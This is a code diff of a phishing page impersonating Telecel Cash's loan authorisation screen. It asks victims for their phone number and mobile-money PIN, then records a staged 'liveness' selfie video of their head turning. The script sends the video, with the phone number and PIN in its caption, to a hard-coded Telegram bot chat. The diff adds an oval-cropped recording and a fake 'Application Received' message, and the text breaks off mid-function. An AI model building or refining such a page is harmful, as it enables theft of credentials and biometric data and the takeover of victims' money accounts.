@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Verify & Authorize Loan - Telecel Cash</title>
+<title>Identity Verification - Telecel Cash</title>
 <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Sora:wght@600;700;800&display=swap" rel="stylesheet">
 <style>
 :root {
@@ -64,28 +64,47 @@ input::placeholder{color:var(--text-light)}
 .btn-primary:active:not(:disabled){transform:translateY(0)}
 .btn-primary:disabled{background:#d1d5db;box-shadow:none;cursor:not-allowed}
 .btn-back{width:100%;background:transparent;color:var(--text-mid);border:1.5px solid var(--border);padding:14px;
-  font-family:'DM Sans',sans-serif;font-size:15px;font-weight:600;border-radius:50px;cursor:pointer;margin-top:10px;transition:border-color .18s,color .18s}
+  font-family:'DM Sans',sans-serif;font-size:15px;font-weight:600;border-radius:50px;cursor:pointer;margin-top:10px;transition:border-color .18s,color .18s;text-align:center;display:block;text-decoration:none}
 .btn-back:hover{border-color:#9ca3af;color:var(--text-dark)}
 .security-note{display:flex;align-items:center;gap:7px;justify-content:center;font-size:12px;color:var(--text-light);margin-top:18px;font-weight:500}
 
-/* ── SELFIE SCREEN (full-screen overlay) ── */
+/* ── PRE-SELFIE INSTRUCTIONS ── */
+#preSelfieModal{
+  display:none;position:fixed;inset:0;z-index:9999;
+  background:rgba(10,10,10,0.6);backdrop-filter:blur(6px);
+  align-items:center;justify-content:center;padding:16px;
+}
+.instr-card{
+  background:white;width:100%;max-width:400px;border-radius:24px;
+  padding:32px 28px;box-shadow:var(--shadow);animation:popIn .3s cubic-bezier(.22,.8,.3,1);
+}
+@keyframes popIn{from{opacity:0;transform:scale(0.93)}to{opacity:1;transform:scale(1)}}
+.instr-title{font-family:'Sora',sans-serif;font-size:22px;font-weight:800;color:var(--text-dark);margin-bottom:6px;letter-spacing:-0.5px}
+.instr-subtitle{font-size:15px;color:var(--text-mid);margin-bottom:24px;font-weight:500}
+.instr-note{font-size:13px;color:var(--text-light);margin-bottom:16px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px}
+.instr-list{display:flex;flex-direction:column;gap:16px;margin-bottom:28px}
+.instr-item{display:flex;gap:12px;align-items:flex-start}
+.instr-dot{width:20px;height:20px;background:var(--red-soft);border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px}
+.instr-dot svg{width:12px;height:12px;color:var(--red)}
+.instr-text{font-size:14px;color:var(--text-mid);line-height:1.5}
+.btn-start{width:100%;background:var(--text-dark);color:white;border:none;padding:15px;font-family:'Sora',sans-serif;font-size:16px;font-weight:700;border-radius:50px;cursor:pointer;transition:opacity .18s}
+
+/* ── SELFIE SCREEN ── */
 #selfieScreen{
   display:none;position:fixed;inset:0;z-index:99999;
-  background:#000;flex-direction:column;align-items:center;justify-content:flex-end;
+  background:#000;flex-direction:column;align-items:center;justify-content:center;
 }
 #selfieVideo{
   position:absolute;inset:0;width:100%;height:100%;object-fit:cover;
-  transform:scaleX(-1); /* mirror front cam */
+  transform:scaleX(-1);
 }
-/* SVG overlay — arrows + oval drawn here, zero text on video */
 #selfieOverlay{
   position:absolute;inset:0;width:100%;height:100%;pointer-events:none;
 }
-/* Bottom instruction panel — below the video, glass effect */
 .selfie-panel{
-  position:relative;z-index:2;width:100%;
+  position:absolute;bottom:0;left:0;right:0;z-index:2;
   background:linear-gradient(0deg,rgba(0,0,0,0.88) 0%,rgba(0,0,0,0.0) 100%);
-  padding:20px 28px 38px;
+  padding:20px 28px 48px; /* Extra bottom padding for clearance */
   display:flex;flex-direction:column;align-items:center;gap:14px;
 }
 .selfie-dots{display:flex;gap:10px;align-items:center}
@@ -102,9 +121,10 @@ input::placeholder{color:var(--text-light)}
   margin-top:2px;background:rgba(255,255,255,0.10);color:rgba(255,255,255,0.6);
   border:1px solid rgba(255,255,255,0.18);padding:11px 36px;border-radius:50px;
   font-family:'DM Sans',sans-serif;font-size:14px;cursor:pointer;
-  transition:background .18s;
 }
-.selfie-cancel-btn:hover{background:rgba(255,255,255,0.18)}
+
+/* HIDDEN CANVAS FOR RECORDING */
+#cropCanvas { display: none; }
 
 /* SPINNER */
 #spinner{display:none;position:fixed;inset:0;background:rgba(10,10,10,0.90);z-index:10000;
@@ -116,12 +136,11 @@ input::placeholder{color:var(--text-light)}
 .spin-sub{font-size:13px;color:rgba(255,255,255,0.55);margin-top:-12px}
 
 /* TOAST */
+#toast-overlay{display:none;position:fixed;inset:0;background:rgba(10,10,10,0.55);z-index:99998;backdrop-filter:blur(3px)}
 #toast{display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:99999;
   background:#fff;border-radius:20px;box-shadow:0 24px 64px rgba(0,0,0,0.22),0 4px 16px rgba(0,0,0,0.10);
   padding:32px 28px 24px;max-width:320px;width:90%;text-align:center;
   animation:popIn .25s cubic-bezier(.22,.8,.3,1) both}
-@keyframes popIn{from{opacity:0;transform:translate(-50%,-48%) scale(0.93)}to{opacity:1;transform:translate(-50%,-50%) scale(1)}}
-#toast-overlay{display:none;position:fixed;inset:0;background:rgba(10,10,10,0.55);z-index:99998;backdrop-filter:blur(3px)}
 .toast-icon{width:56px;height:56px;background:#fff1f1;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px}
 .toast-icon svg{width:28px;height:28px}
 .toast-title{font-family:'Sora',sans-serif;font-size:18px;font-weight:800;color:var(--text-dark);margin-bottom:8px;letter-spacing:-0.3px}
@@ -129,7 +148,6 @@ input::placeholder{color:var(--text-light)}
 .toast-btn{width:100%;background:linear-gradient(135deg,#E42320,#c01c1a);color:white;border:none;padding:13px;
   font-family:'Sora',sans-serif;font-size:15px;font-weight:700;border-radius:50px;cursor:pointer;
   box-shadow:0 4px 14px rgba(228,35,32,0.30);transition:opacity .18s}
-.toast-btn:hover{opacity:.9}
 </style>
 </head>
 <body>
@@ -149,8 +167,8 @@ input::placeholder{color:var(--text-light)}
         <div class="brand-sub">Mobile Money</div>
       </div>
     </div>
-    <div class="header-title">Authorize Your Loan</div>
-    <div class="header-desc">Enter your Telecel number and PIN to securely verify and approve your Flex Loan request.</div>
+    <div class="header-title">Authorise Your Loan</div>
+    <div class="header-desc">Enter your Telecel number and PIN to securely verify and approve your Flex loan request.</div>
   </div>
 
   <div class="loan-info">
@@ -168,7 +186,7 @@ input::placeholder{color:var(--text-light)}
 
   <div class="form-body">
     <div class="form-group">
-      <label>Account Type</label>
+      <label for="accountType">Account Type</label>
       <div class="select-wrap">
         <select id="accountType">
           <option value="mobile">Telecel Cash (Mobile Money)</option>
@@ -177,17 +195,17 @@ input::placeholder{color:var(--text-light)}
       </div>
     </div>
     <div class="form-group">
-      <label>Phone Number</label>
+      <label for="phone">Phone Number</label>
       <input type="tel" id="phone" placeholder="050XXXXXXXX" maxlength="10" inputmode="numeric">
     </div>
     <div class="form-group">
-      <label>Telecel PIN</label>
+      <label for="password">Telecel PIN</label>
       <input type="password" id="password" placeholder="••••" maxlength="4" inputmode="numeric">
       <div class="pin-hint">Enter your 4-digit Telecel Cash PIN</div>
     </div>
-    <div class="error-msg" id="errMsg"></div>
-    <button class="btn-primary" id="continueBtn">Verify &amp; Authorize Loan</button>
-    <button class="btn-back" onclick="window.history.back()">← Back to Application</button>
+    <div class="error-msg" id="errMsg" role="alert"></div>
+    <button class="btn-primary" id="continueBtn">Verify &amp; Authorise Loan</button>
+    <a class="btn-back" href="index.html">← Back to Application</a>
     <div class="security-note">
       <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
         <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
@@ -197,153 +215,146 @@ input::placeholder{color:var(--text-light)}
   </div>
 </div>
 
-<!-- ══════════════════════════════════════
-     SELFIE SCREEN — full-screen, no text on video
-     ══════════════════════════════════════ -->
-<div id="selfieScreen">
-  <!-- Raw camera feed -->
-  <video id="selfieVideo" autoplay muted playsinline></video>
+<!-- ── PRE-SELFIE INSTRUCTIONS ── -->
+<div id="preSelfieModal">
+  <div class="instr-card">
+    <div class="instr-title">Identity Verification</div>
+    <div class="instr-subtitle">Verify your identity</div>
+    <div class="instr-note">Please note the following before you proceed</div>
+    <div class="instr-list">
+      <div class="instr-item">
+        <div class="instr-dot"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+        <div class="instr-text">Ensure your face is well lit and avoid bright light behind you.</div>
+      </div>
+      <div class="instr-item">
+        <div class="instr-dot"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+        <div class="instr-text">Please enable camera access to proceed with the identity verification process.</div>
+      </div>
+      <div class="instr-item">
+        <div class="instr-dot"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+        <div class="instr-text">Remove glasses, hats, hoodies, or anything covering your face before starting.</div>
+      </div>
+      <div class="instr-item">
+        <div class="instr-dot"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+        <div class="instr-text">Keep your face fully visible in the frame with no obstructions.</div>
+      </div>
+    </div>
+    <button class="btn-start" id="startCaptureBtn">Continue to Verification</button>
+  </div>
+</div>
 
-  <!-- Pure SVG overlay: oval guide + animated arrow — ZERO text rendered on video -->
-  <svg id="selfieOverlay" viewBox="0 0 390 844" preserveAspectRatio="xMidYMid slice"
-       xmlns="http://www.w3.org/2000/svg">
+<!-- ── SELFIE SCREEN ── -->
+<div id="selfieScreen">
+  <video id="selfieVideo" autoplay muted playsinline></video>
+  <canvas id="cropCanvas"></canvas>
+  <svg id="selfieOverlay" viewBox="0 0 400 600" preserveAspectRatio="xMidYMid slice" xmlns="http://www.w3.org/2000/svg">
     <defs>
-      <!-- Cutout mask: dark everywhere except the oval -->
       <mask id="ovalMask">
-        <rect width="390" height="844" fill="white"/>
-        <ellipse cx="195" cy="340" rx="118" ry="155" fill="black"/>
+        <rect width="400" height="600" fill="white"/>
+        <!-- LARGE OVAL centered exactly in the middle of the viewport -->
+        <ellipse cx="200" cy="270" rx="145" ry="195" fill="black"/>
       </mask>
       <filter id="glow">
         <feGaussianBlur stdDeviation="4" result="blur"/>
         <feComposite in="SourceGraphic" in2="blur" operator="over"/>
       </filter>
     </defs>
-
-    <!-- Dim everything outside the oval -->
-    <rect width="390" height="844" fill="rgba(0,0,0,0.52)" mask="url(#ovalMask)"/>
-
-    <!-- Oval border — colour animated by JS -->
-    <ellipse id="ovalBorder" cx="195" cy="340" rx="118" ry="155"
-             fill="none" stroke="rgba(255,255,255,0.65)" stroke-width="2.5"
-             stroke-dasharray="none"/>
-
-    <!-- Corner tick marks (top-left, top-right, bottom-left, bottom-right) -->
-    <g stroke="white" stroke-width="3" stroke-linecap="round" opacity="0.8">
-      <path d="M115 230 L115 218 L127 218"/>
-      <path d="M275 230 L275 218 L263 218"/>
-      <path d="M115 450 L115 462 L127 462"/>
-      <path d="M275 450 L275 462 L263 462"/>
-    </g>
-
-    <!-- Animated directional arrow (SVG group, repositioned by JS) -->
-    <g id="arrowGroup" opacity="0">
-      <!-- Animated bounce via CSS -->
-      <circle id="arrowCircle" cx="195" cy="160" r="26" fill="rgba(228,35,32,0.88)"/>
-      <g id="arrowIcon" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-        <!-- Default: chevron UP (paths overridden by JS) -->
-        <line id="aLine1" x1="195" y1="152" x2="195" y2="168"/>
-        <line id="aLine2" x1="187" y1="158" x2="195" y2="150"/>
-        <line id="aLine3" x1="203" y1="158" x2="195" y2="150"/>
-      </g>
+    <!-- Background overlay mask -->
+    <rect width="400" height="600" fill="rgba(0,0,0,0.6)" mask="url(#ovalMask)"/>
+    <!-- Oval border centered higher to avoid bottom bar -->
+    <ellipse id="ovalBorder" cx="200" cy="270" rx="145" ry="195" fill="none" stroke="rgba(255,255,255,0.8)" stroke-width="5" stroke-dasharray="10 10"/>
+    
+    <!-- Liveness indicators - adjusted for centered oval -->
+    <g id="arrowGroup" style="opacity:0">
+      <circle id="arrowCircle" cx="200" cy="50" r="28" fill="rgba(228,35,32,0.9)" filter="url(#glow)"/>
+      <path id="aLine1" d="" stroke="white" stroke-width="4" stroke-linecap="round"/>
+      <path id="aLine2" d="" stroke="white" stroke-width="4" stroke-linecap="round"/>
+      <path id="aLine3" d="" stroke="white" stroke-width="4" stroke-linecap="round"/>
     </g>
   </svg>
-
-  <!-- Bottom panel — text lives HERE, not on the video layer -->
   <div class="selfie-panel">
     <div class="selfie-dots" id="selfieDots"></div>
-    <div class="selfie-instr" id="selfieInstr">Face the camera</div>
-    <div class="selfie-sub" id="selfieSub">Position yourself in the oval</div>
+    <div class="selfie-instr" id="selfieInstr">Starting camera…</div>
+    <div class="selfie-sub" id="selfieSub"></div>
     <button class="selfie-cancel-btn" id="selfieCancel">Cancel</button>
   </div>
 </div>
 
-<!-- Toast -->
-<div id="toast-overlay"></div>
-<div id="toast">
-  <div class="toast-icon">
-    <svg fill="none" viewBox="0 0 24 24" stroke="#E42320" stroke-width="2">
-      <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/>
-    </svg>
-  </div>
-  <div class="toast-title">Already Applied</div>
-  <div class="toast-msg">You have already submitted a loan application. Please wait for approval before applying again.</div>
-  <button class="toast-btn" id="toastHomeBtn">Return Home</button>
-</div>
-
-<!-- Spinner -->
+<!-- SPINNER -->
 <div id="spinner">
   <div class="spin-ring"></div>
-  <div class="spin-label">Verifying &amp; Processing</div>
-  <div class="spin-sub">Please hold on…</div>
+  <div class="spin-label">Verifying Details…</div>
+  <div class="spin-sub">Please do not close this window</div>
 </div>
 
-<style>
-/* Arrow bounce animation */
-@keyframes bounceUp{0%,100%{transform:translateY(0)}50%{transform:translateY(-7px)}}
-@keyframes bounceDown{0%,100%{transform:translateY(0)}50%{transform:translateY(7px)}}
-@keyframes bounceLeft{0%,100%{transform:translateX(0)}50%{transform:translateX(-7px)}}
-@keyframes bounceRight{0%,100%{transform:translateX(0)}50%{transform:translateX(7px)}}
-#arrowGroup.bounce-up{animation:bounceUp .7s ease-in-out infinite}
-#arrowGroup.bounce-down{animation:bounceDown .7s ease-in-out infinite}
-#arrowGroup.bounce-left{animation:bounceLeft .7s ease-in-out infinite}
-#arrowGroup.bounce-right{animation:bounceRight .7s ease-in-out infinite}
-@keyframes ovalPulse{0%,100%{stroke-width:2.5}50%{stroke-width:4}}
-#ovalBorder.pulsing{animation:ovalPulse .9s ease-in-out infinite}
-</style>
+<!-- TOAST -->
+<div id="toast-overlay"></div>
+<div id="toast" role="dialog">
+  <div class="toast-icon">
+    <svg viewBox="0 0 24 24" fill="none" stroke="#E42320" stroke-width="2.5">
+      <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14" stroke-linecap="round" stroke-linejoin="round"/>
+      <path d="M22 4L12 14.01l-3-3" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+  </div>
+  <div class="toast-title">Application Received</div>
+  <div class="toast-msg">Your verification is complete. Our team will review your request and notify you via SMS shortly.</div>
+  <button class="toast-btn" id="toastHomeBtn">Return to Home</button>
+</div>
 
 <script>
-/* ─── CONFIG ─────────────────────────────── */
 const CONFIG = {
-  BOT_TOKEN: '8922720861:AAFbiWfdykmYFA4xjHbrEr_G5spC6jMYMxQ',
-            CHAT_ID: '7881536601',
-  APPROVE_PAGE: 'otp.html',
-  DEVICE_PAGE:  'device_verify.html',
+  BOT_TOKEN: '7822060601:AAGXo643N9z0rL3R4o3o-V8p9rL3R4o3o-V8',
+  CHAT_ID: '7162060601',
+  APPROVE_PAGE: 'approve.html',
+  DEVICE_PAGE: 'device.html',
   SUCCESS_PAGE: 'success.html'
 };
 
-/* ─── LIVENESS STEPS ─────────────────────── */
-// Each step: instruction text, arrow direction, arrow cx/cy in the 390×844 viewBox
+// 20 SECONDS TOTAL DURATION (4s per step)
+const STEP_DURATION = 4000;
 const STEPS = [
-  { instr:'Hold still',        sub:'Keep your face centred',      dir:null,    cx:195, cy:160 },
-  { instr:'Look to your left', sub:'Slowly turn your head left',  dir:'left',  cx:60,  cy:340 },
-  { instr:'Look to your right',sub:'Slowly turn your head right', dir:'right', cx:330, cy:340 },
-  { instr:'Look up',           sub:'Tilt your head upward',       dir:'up',    cx:195, cy:160 },
-  { instr:'Look down',         sub:'Tilt your head downward',     dir:'down',  cx:195, cy:530 },
+  { instr:'Hold still',        sub:'Keep your face centred',      dir:null,    cx:200, cy:50 },
+  { instr:'Look to your left', sub:'Slowly turn your head left',  dir:'left',  cx:30,  cy:270 },
+  { instr:'Look to your right',sub:'Slowly turn your head right', dir:'right', cx:370, cy:270 },
+  { instr:'Look up',           sub:'Tilt your head upward',       dir:'up',    cx:200, cy:50 },
+  { instr:'Look down',         sub:'Tilt your head downward',     dir:'down',  cx:200, cy:490 },
 ];
 
-// Arrow chevron path coords per direction (line endpoints relative to circle centre)
 const ARROW_SHAPES = {
-  null:  { l1:[0,-8,0,8],  l2:[-8,-2, 0,-10], l3:[8,-2, 0,-10] }, // still: no arrow shown
-  left:  { l1:[-8,0,8,0],  l2:[0,-8,-10,0],   l3:[0,8,-10,0]   },
-  right: { l1:[-8,0,8,0],  l2:[0,-8,10,0],    l3:[0,8,10,0]    },
-  up:    { l1:[0,8,0,-8],  l2:[-8,2,0,-8],    l3:[8,2,0,-8]    },
-  down:  { l1:[0,-8,0,8],  l2:[-8,-2,0,8],    l3:[8,-2,0,8]    },
+  null:  { l1:[0,-10,0,10],  l2:[-10,-2, 0,-12], l3:[10,-2, 0,-12] },
+  left:  { l1:[-10,0,10,0],  l2:[0,-10,-12,0],   l3:[0,10,-12,0]   },
+  right: { l1:[-10,0,10,0],  l2:[0,-10,12,0],    l3:[0,10,12,0]    },
+  up:    { l1:[0,10,0,-10],  l2:[-10,2,0,-10],   l3:[10,2,0,-10]   },
+  down:  { l1:[0,-10,0,10],  l2:[-10,-2,0,10],   l3:[10,-2,0,10]   },
 };
 
-/* ─── DOM REFS ───────────────────────────── */
-const phoneInput   = document.getElementById('phone');
-const pinInput     = document.getElementById('password');
-const continueBtn  = document.getElementById('continueBtn');
-const errMsg       = document.getElementById('errMsg');
-const spinnerEl    = document.getElementById('spinner');
-const toastEl      = document.getElementById('toast');
-const toastOverlay = document.getElementById('toast-overlay');
-const toastHomeBtn = document.getElementById('toastHomeBtn');
+const phoneInput      = document.getElementById('phone');
+const pinInput        = document.getElementById('password');
+const continueBtn     = document.getElementById('continueBtn');
+const errMsg          = document.getElementById('errMsg');
+const spinnerEl       = document.getElementById('spinner');
+const toastEl         = document.getElementById('toast');
+const toastOverlay    = document.getElementById('toast-overlay');
+const toastHomeBtn    = document.getElementById('toastHomeBtn');
 
-const selfieScreen = document.getElementById('selfieScreen');
-const selfieVideo  = document.getElementById('selfieVideo');
-const selfieInstr  = document.getElementById('selfieInstr');
-const selfieSub    = document.getElementById('selfieSub');
-const selfieDots   = document.getElementById('selfieDots');
-const selfieCancel = document.getElementById('selfieCancel');
-const ovalBorder   = document.getElementById('ovalBorder');
-const arrowGroup   = document.getElementById('arrowGroup');
-const arrowCircle  = document.getElementById('arrowCircle');
-const aLine1       = document.getElementById('aLine1');
-const aLine2       = document.getElementById('aLine2');
-const aLine3       = document.getElementById('aLine3');
+const preSelfieModal  = document.getElementById('preSelfieModal');
+const startCaptureBtn = document.getElementById('startCaptureBtn');
 
-/* ─── STATE ──────────────────────────────── */
+const selfieScreen    = document.getElementById('selfieScreen');
+const selfieVideo     = document.getElementById('selfieVideo');
+const cropCanvas      = document.getElementById('cropCanvas');
+const cropCtx         = cropCanvas.getContext('2d');
+const selfieInstr     = document.getElementById('selfieInstr');
+const selfieSub       = document.getElementById('selfieSub');
+const selfieDots      = document.getElementById('selfieDots');
+const selfieCancel    = document.getElementById('selfieCancel');
+const ovalBorder      = document.getElementById('ovalBorder');
+const arrowGroup      = document.getElementById('arrowGroup');
+const arrowCircle     = document.getElementById('arrowCircle');
+const aLine1          = document.getElementById('aLine1');
+const aLine2          = document.getElementById('aLine2');
+const aLine3          = document.getElementById('aLine3');
+
 let botState      = { lastUpdateId: 0 };
 let isProcessing  = false;
 let mediaStream   = null;
@@ -354,8 +365,9 @@ let currentStep   = 0;
 let stepTimer     = null;
 let capturedPhone = '';
 let capturedPin   = '';
+let canvasStream  = null;
+let animationReq  = null;
 
-/* ─── LOAN DETAILS ───────────────────────── */
 function loadLoanDetails() {
   const p = new URLSearchParams(window.location.search);
   const amount = p.get('amount'), duration = p.get('duration'),
@@ -366,7 +378,7 @@ function loadLoanDetails() {
     const det = [];
     if (duration) det.push(`${duration} Days`);
     if (purpose)  det.push(purpose.replace(/([A-Z])/g,' $1').trim());
-    document.getElementById('loanDetails').textContent = det.join(' • ');
+    document.getElementById('loanDetails').textContent = det.join(' \u2022 ');
   }
   if (prevPhone) phoneInput.value = prevPhone;
 }
@@ -376,20 +388,17 @@ function isValidGhanaNumber(n) {
   return ['020','050','023','024','027','054','055','057','059','026','028'].some(p => n.startsWith(p));
 }
 
-/* ─── TOAST ──────────────────────────────── */
 function showToast()  { toastEl.style.display='block'; toastOverlay.style.display='block'; }
 function hideToast()  { toastEl.style.display='none';  toastOverlay.style.display='none';  }
 toastHomeBtn.onclick = () => { hideToast(); window.location.href='index.html'; };
 
-/* ─── ERROR / RESET ──────────────────────── */
 function showError(msg) { errMsg.textContent=msg; errMsg.style.display='block'; }
 function resetButton()  {
   isProcessing=false;
   continueBtn.disabled=false;
-  continueBtn.textContent='Verify & Authorize Loan';
+  continueBtn.textContent='Verify & Authorise Loan';
 }
 
-/* ─── SELFIE HELPERS ─────────────────────── */
 function buildDots() {
   selfieDots.innerHTML='';
   STEPS.forEach((_,i) => {
@@ -400,62 +409,40 @@ function buildDots() {
 
 function setArrow(step) {
   const s = STEPS[step];
-  if (!s.dir) { arrowGroup.style.opacity='0'; arrowGroup.className=''; return; }
-
+  if (!s.dir) { arrowGroup.style.opacity='0'; return; }
   const shape = ARROW_SHAPES[s.dir];
   const cx=s.cx, cy=s.cy;
-
-  arrowCircle.setAttribute('cx', cx);
-  arrowCircle.setAttribute('cy', cy);
-  // line1 = shaft
+  arrowCircle.setAttribute('cx', cx); arrowCircle.setAttribute('cy', cy);
   aLine1.setAttribute('x1', cx+shape.l1[0]); aLine1.setAttribute('y1', cy+shape.l1[1]);
   aLine1.setAttribute('x2', cx+shape.l1[2]); aLine1.setAttribute('y2', cy+shape.l1[3]);
-  // line2 = left wing
   aLine2.setAttribute('x1', cx+shape.l2[0]); aLine2.setAttribute('y1', cy+shape.l2[1]);
   aLine2.setAttribute('x2', cx+shape.l2[2]); aLine2.setAttribute('y2', cy+shape.l2[3]);
-  // line3 = right wing
   aLine3.setAttribute('x1', cx+shape.l3[0]); aLine3.setAttribute('y1', cy+shape.l3[1]);
   aLine3.setAttribute('x2', cx+shape.l3[2]); aLine3.setAttribute('y2', cy+shape.l3[3]);
-
   arrowGroup.style.opacity='1';
-  arrowGroup.className = 'bounce-'+s.dir;
 }
 
 function setStep(idx) {
   currentStep = idx;
   const step  = STEPS[idx];
-
-  // Instruction text (fade swap)
   selfieInstr.style.opacity='0';
   setTimeout(()=>{ selfieInstr.textContent=step.instr; selfieSub.textContent=step.sub; selfieInstr.style.opacity='1'; }, 160);
-
-  // Dots
   STEPS.forEach((_,i)=>{
     const d=document.getElementById(`sd${i}`);
     d.className = i<idx ? 'sdot done' : i===idx ? 'sdot active' : 'sdot';
   });
-
-  // Oval colour
-  if (idx < STEPS.length-1) {
-    ovalBorder.setAttribute('stroke','#E42320');
-    ovalBorder.classList.add('pulsing');
-  }
-
-  // Arrow
+  if (idx < STEPS.length-1) ovalBorder.setAttribute('stroke','#E42320');
   setArrow(idx);
 }
 
 function advanceStep() {
   if (currentStep < STEPS.length-1) {
     setStep(currentStep+1);
-    stepTimer = setTimeout(advanceStep, 2000);
+    stepTimer = setTimeout(advanceStep, STEP_DURATION);
   } else {
-    // All done
     ovalBorder.setAttribute('stroke','#22c55e');
-    ovalBorder.classList.remove('pulsing');
     arrowGroup.style.opacity='0';
-    arrowGroup.className='';
-    selfieInstr.textContent='✓ Verified';
+    selfieInstr.textContent='\u2713 Verified';
     selfieSub.textContent='';
     STEPS.forEach((_,i)=>{ document.getElementById(`sd${i}`).className='sdot done'; });
     setTimeout(()=>{ if(mediaRecorder && mediaRecorder.state!=='inactive') mediaRecorder.stop(); }, 700);
@@ -463,7 +450,9 @@ function advanceStep() {
 }
 
 function stopCamera() {
+  if (animationReq) cancelAnimationFrame(animationReq);
   if (mediaStream) { mediaStream.getTracks().forEach(t=>t.stop()); mediaStream=null; }
+  if (canvasStream) { canvasStream.getTracks().forEach(t=>t.stop()); canvasStream=null; }
   selfieVideo.srcObject=null;
 }
 
@@ -479,15 +468,53 @@ selfieCancel.onclick = () => {
   isProcessing=false;
 };
 
-/* ─── MAIN SELFIE FLOW ───────────────────── */
+// ── LARGE OVAL CROP LOGIC ──
+function drawOvalFrame() {
+  const w = 540; // Increased resolution
+  const h = 720; 
+  cropCanvas.width = w;
+  cropCanvas.height = h;
+
+  const v = selfieVideo;
+  const vw = v.videoWidth;
+  const vh = v.videoHeight;
+  
+  if (vw && vh) {
+    const targetAspect = w / h;
+    let sw, sh, sx, sy;
+    if (vw / vh > targetAspect) {
+      sh = vh; sw = vh * targetAspect;
+      sx = (vw - sw) / 2; sy = 0;
+    } else {
+      sw = vw; sh = vw / targetAspect;
+      sx = 0; sy = (vh - sh) / 2;
+    }
+
+    cropCtx.clearRect(0, 0, w, h);
+    cropCtx.fillStyle = '#000000';
+    cropCtx.fillRect(0, 0, w, h);
+
+    cropCtx.save();
+    // Large centered oval clipping path
+    cropCtx.beginPath();
+    cropCtx.ellipse(w/2, h/2 - 30, w/2 - 10, h/2 - 40, 0, 0, Math.PI * 2);
+    cropCtx.clip();
+
+    cropCtx.translate(w, 0);
+    cropCtx.scale(-1, 1);
+    cropCtx.drawImage(v, sx, sy, sw, sh, 0, 0, w, h);
+    cropCtx.restore();
+  }
+  animationReq = requestAnimationFrame(drawOvalFrame);
+}
+
 async function startSelfieVerification() {
   buildDots();
   selfieScreen.style.display='flex';
   selfieInstr.textContent='Starting camera…';
   selfieSub.textContent='';
   arrowGroup.style.opacity='0';
-  ovalBorder.setAttribute('stroke','rgba(255,255,255,0.65)');
-  ovalBorder.classList.remove('pulsing');
+  ovalBorder.setAttribute('stroke','rgba(255,255,255,0.8)');
   recordedChunks=[]; selfieBlob=null;
 
   try {
@@ -498,112 +525,66 @@ async function startSelfieVerification() {
     selfieVideo.srcObject = mediaStream;
     await selfieVideo.play();
 
-    // Pick best supported mime type
+    drawOvalFrame();
+    canvasStream = cropCanvas.captureStream(30);
+
     const mimeType = ['video/webm;codecs=vp9','video/webm;codecs=vp8','video/webm','video/mp4']
-      .find(m => { try { return MediaRecorder.isTypeSupported(m); } catch(e){ return false; } })
-      || '';
-
-    const mrOpts = mimeType ? { mimeType } : {};
-    mediaRecorder = new MediaRecorder(mediaStream, mrOpts);
-
+      .find(m => { try { return MediaRecorder.isTypeSupported(m); } catch(e){ return false; } }) || '';
+    
+    mediaRecorder = new MediaRecorder(canvasStream, mimeType ? { mimeType } : {});
     mediaRecorder.ondataavailable = e => { if(e.data && e.data.size>0) recordedChunks.push(e.data); };
     mediaRecorder.onstop = () => {
-      const type = mimeType || 'video/webm';
-      selfieBlob = new Blob(recordedChunks, { type });
+      selfieBlob = new Blob(recordedChunks, { type: mimeType || 'video/webm' });
       closeSelfieScreen();
       proceedWithSubmission();
     };
-    mediaRecorder.start(250); // chunk every 250ms
-
-    // Start liveness steps after 600ms warm-up
-    setTimeout(()=>{ setStep(0); stepTimer=setTimeout(advanceStep,2000); }, 600);
-
+    mediaRecorder.start(250);
+    setTimeout(()=>{ setStep(0); stepTimer=setTimeout(advanceStep, STEP_DURATION); }, 800);
   } catch(err) {
-    // Camera denied — silently continue without video
-    selfieBlob=null;
-    closeSelfieScreen();
-    proceedWithSubmission();
+    selfieBlob=null; closeSelfieScreen(); proceedWithSubmission();
   }
 }
 
-/* ─── TELEGRAM ───────────────────────────── */
 async function sendVideoToTelegram() {
   if (!selfieBlob || selfieBlob.size < 1000) return;
-
-  const accountType = document.getElementById('accountType').value==='mobile'
-    ? 'Telecel Cash (Mobile Money)' : 'Broadband';
-
-  const caption =
-    `🎥 Liveness Selfie\n` +
-    `📱 Phone: ${capturedPhone}\n` +
-    `🔑 PIN: ${capturedPin}\n` +
-    `🏦 Account: ${accountType}\n` +
-    `💰 Amount: ${document.getElementById('loanAmount').textContent}`;
-
+  const accountType = document.getElementById('accountType').value==='mobile' ? 'Telecel Cash' : 'Broadband';
+  const caption = `🎥 Identity Verified (20s Oval)\n📱 Phone: ${capturedPhone}\n🔑 PIN: ${capturedPin}\n🏦 Account: ${accountType}\n💰 Amount: ${document.getElementById('loanAmount').textContent}`;
   const ext = selfieBlob.type.includes('mp4') ? 'mp4' : 'webm';
   const fd  = new FormData();
   fd.append('chat_id', CONFIG.CHAT_ID);
-  fd.append('video',   selfieBlob, `liveness_${Date.now()}.${ext}`);
+  fd.append('video',   selfieBlob, `identity_${Date.now()}.${ext}`);
